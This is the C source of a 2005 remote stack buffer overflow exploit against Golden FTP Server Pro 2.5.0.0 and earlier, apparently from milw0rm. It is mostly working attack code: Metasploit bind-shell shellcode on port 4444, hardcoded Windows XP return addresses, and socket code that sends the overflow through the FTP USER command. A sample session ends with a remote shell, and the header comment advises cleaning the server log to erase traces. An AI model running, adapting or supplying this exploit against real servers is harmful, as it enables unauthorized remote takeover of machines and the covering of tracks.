/*
   Golden FTP Server Pro remote stack BOF exploit
   author : c0d3r "kaveh razavi" c0d3rz_team@yahoo.com c0d3r@ihsteam.com
   risk : highly critical
   vender status : no patch released , all targets are vuln 
   package : golden-ftp-server-pro 2.5.0.0 and prior
   advisory :  http://secunia.com/advisories/15156/
   vender address : www.goldenftpserver.com
   timeline :
   28 Apr 2005 : Public Disclosure
   29 Apr 2005 : IHS exploit released , winxpsp1 & winxpsp2 target
   after running the exploit u need to restart the server after that 
   the server will be closed automatically then u will have a shell
   on port 4444 . if u want to erase the crap just clean the GFTPpro.log
   manually as mentioned in the advisory .
   workaround : upgrade to newer version or use another FTP server . 
   compiled with visual c++ 6 : cl golden-ftp.c
   greetz : IHSTeam members,exploit-dev mates,securiteam,str0ke-milw0rm
   (C) IHS security 2005
*/

/*
D:\projects>golden-ftp 127.0.0.1 21 0

-------- Golden FTP Server Pro remote stack BOF exploit by c0d3r

[+] building overflow string
[+] attacking host 127.0.0.1
[+] packet size = 755 byte
[+] connected
[+] sending the overflow string
[+] exploit sent successfully !
[+] restart the Ftp server then nc 127.0.0.1 4444


D:\projects>nc -vv 127.0.0.1 4444
DNS fwd/rev mismatch: localhost != kaveh
localhost [127.0.0.1] 4444 (?) open
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Program Files\Golden FTP Server Pro>
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#define NOP 0x90
#define size 755

// 5 byte user command + 332 byte NOP junk + 4 byte return address
// + 15 byte NOP + 399 byte shellcode 

// using metasploit great shellcode LPORT=4444 Size=399

unsigned char shellcode[] =
"\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\x4f\x85"
"\x2f\x98\x83\xeb\xfc\xe2\xf4\xb3\x6d\x79\x98\x4f\x85\x7c\xcd\x19"
"\xd2\xa4\xf4\x6b\x9d\xa4\xdd\x73\x0e\x7b\x9d\x37\x84\xc5\x13\x05"
"\x9d\xa4\xc2\x6f\x84\xc4\x7b\x7d\xcc\xa4\xac\xc4\x84\xc1\xa9\xb0"
"\x79\x1e\x58\xe3\xbd\xcf\xec\x48\x44\xe0\x95\x4e\x42\xc4\x6a\x74"
"\xf9\x0b\x8c\x3a\x64\xa4\xc2\x6b\x84\xc4\xfe\xc4\x89\x64\x13\x15"
"\x99\x2e\x73\xc4\x81\xa4\x99\xa7\x6e\x2d\xa9\x8f\xda\x71\xc5\x14"
"\x47\x27\x98\x11\xef\x1f\xc1\x2b\x0e\x36\x13\x14\x89\xa4\xc3\x53"
"\x0e\x34\x13\x14\x8d\x7c\xf0\xc1\xcb\x21\x74\xb0\x53\xa6\x5f\xce"
"\x69\x2f\x99\x4f\x85\x78\xce\x1c\x0c\xca\x70\x68\x85\x2f\x98\xdf"
"\x84\x2f\x98\xf9\x9c\x37\x7f\xeb\x9c\x5f\x71\xaa\xcc\xa9\xd1\xeb"
"\x9f\x5f\x5f\xeb\x28\x01\x71\x96\x8c\xda\x35\x84\x68\xd3\xa3\x18"
"\xd6\x1d\xc7\x7c\xb7\x2f\xc3\xc2\xce\x0f\xc9\xb0\x52\xa6\x47\xc6"
"\x46\xa2\xed\x5b\xef\x28\xc1\x1e\xd6\xd0\xac\xc0\x7a\x7a\x9c\x16"
"\x0c\x2b\x16\xad\x77\x04\xbf\x1b\x7a\x18\x67\x1a\xb5\x1e\x58\x1f"
"\xd5\x7f\xc8\x0f\xd5\x6f\xc8\xb0\xd0\x03\x11\x88\xb4\xf4\xcb\x1c"
"\xed\x2d\x98\x5e\xd9\xa6\x78\x25\x95\x7f\xcf\xb0\xd0\x0b\xcb\x18"
"\x7a\x7a\xb0\x1c\xd1\x78\x67\x1a\xa5\xa6\x5f\x27\xc6\x62\xdc\x4f"
"\x0c\xcc\x1f\xb5\xb4\xef\x15\x33\xa1\x83\xf2\x5a\xdc\xdc\x33\xc8"
"\x7f\xac\x74\x1b\x43\x6b\xbc\x5f\xc1\x49\x5f\x0b\xa1\x13\x99\x4e"
"\x0c\x53\xbc\x07\x0c\x53\xbc\x03\x0c\x53\xbc\x1f\x08\x6b\xbc\x5f"
"\xd1\x7f\xc9\x1e\xd4\x6e\xc9\x06\xd4\x7e\xcb\x1e\x7a\x5a\x98\x27"
"\xf7\xd1\x2b\x59\x7a\x7a\x9c\xb0\x55\xa6\x7e\xb0\xf0\x2f\xf0\xe2"
"\x5c\x2a\x56\xb0\xd0\x2b\x11\x8c\xef\xd0\x67\x79\x7a\xfc\x67\x3a"
"\x85\x47\x68\xc5\x81\x70\x67\x1a\x81\x1e\x43\x1c\x7a\xff\x98";
  
  
  unsigned int rc,rc2,sock,os,addr ;
  struct sockaddr_in tcp;
  struct hostent *hp;
  WSADATA wsaData;
  unsigned char *recvbuf;
  char buffer[size];
  char jmp_esp[5];
  unsigned short port;
  char hex1[] = "\x75\x73\x65\x72\x20";
  char hex2[] = "\x70\x61\x73\x73\x20\x61\x61\x61\x61";
  char hex3[] = "\x5C\x6E";
  char winxpsp1[] = "\x57\x94\xAE\x77"; // shell32.dll :D
  char winxpsp2[] = "\xED\x1E\x94\x7C"; // not tested
  
 int main (int argc, char *argv[]){
  
 
  if(argc < 3) {
 printf("\n-------- Golden FTP Server Pro remote stack BOF exploit by c0d3r\n");
 printf("-------- usage : golden-ftp.exe host port target\n");
 printf("-------- target 1 : windows xp service pack 1 : 0\n");
 printf("-------- target 2 : windows xp service pack 2 : 1\n");
 printf("-------- eg : golden-ftp.exe 127.0.0.1 80 0\n\n");
 exit(-1) ;
  }
  printf("\n-------- Golden FTP Server Pro remote stack BOF exploit by c0d3r\n\n");
 os = (unsigned short)atoi(argv[3]);
  switch(os)
  {
   case 0:
    strcat(jmp_esp,winxpsp1);
    break;
   case 1:
    strcat(jmp_esp,winxpsp2); // wasnt checked
    break;
   default:
    printf("\n[-] this target doesnt exist in the list\n\n");
   
    exit(-1);
  }

    // Creating heart of exploit code
  
    printf("[+] building overflow string");
  
    memset(buffer,NOP,size);
    memcpy(buffer,hex1,sizeof(hex1)-1);
    memcpy(buffer+337,jmp_esp,sizeof(jmp_esp)-1);
    memcpy(buffer+356,shellcode,sizeof(shellcode)-1);
    buffer[size] = 0;
 
    // EO heart of exploit code

   recvbuf = malloc(256);
   memset(recvbuf,0,256);
   
   if (WSAStartup(MAKEWORD(2,1),&wsaData) != 0){
   printf("[-] WSAStartup failed !\n");
   exit(-1);
  }
 hp = gethostbyname(argv[1]);
  if (!hp){
   addr = inet_addr(argv[1]);
  }
  if ((!hp) && (addr == INADDR_NONE) ){
   printf("[-] unable to resolve %s\n",argv[1]);
   exit(-1);
  }
  sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
  if (!sock){
   printf("[-] socket() error...\n");
   exit(-1);
  }
   if (hp != NULL)
   memcpy(&(tcp.sin_addr),hp->h_addr,hp->h_length);
  else
   tcp.sin_addr.s_addr = addr;

  if (hp)
   tcp.sin_family = hp->h_addrtype;
  else
  tcp.sin_family = AF_INET;
  port=atoi(argv[2]);
  tcp.sin_port=htons(port);
   
  
  printf("\n[+] attacking host %s\n" , argv[1]) ;
  
  
  
  printf("[+] packet size = %d byte\n" , sizeof(buffer));
  
  rc=connect(sock, (struct sockaddr *) &tcp, sizeof (struct sockaddr_in));
  if(rc==0)
  {
    
     Sleep(1000) ;
  printf("[+] connected\n") ;
  printf("[+] sending the overflow string\n") ;
  rc2=recv(sock,recvbuf,256,0);
  Sleep(1000);
  send(sock,buffer,strlen(buffer),0);
  send(sock,"\n",1,0);
  rc2=recv(sock,recvbuf,256,0);
  Sleep(1000);
  send(sock,hex2,strlen(hex2),0);
  send(sock,"\n",1,0);
  printf("[+] exploit sent successfully !\n");
  printf("[+] restart the Ftp server then nc %s 4444\n\n",argv[1]);
  
  }
  
  else {
      printf("[-] ouch! Server is not listening .... \n\n");
 }
  shutdown(sock,1);
  closesocket(sock);
  }
  // EO exploit code

// milw0rm.com [2005-04-29]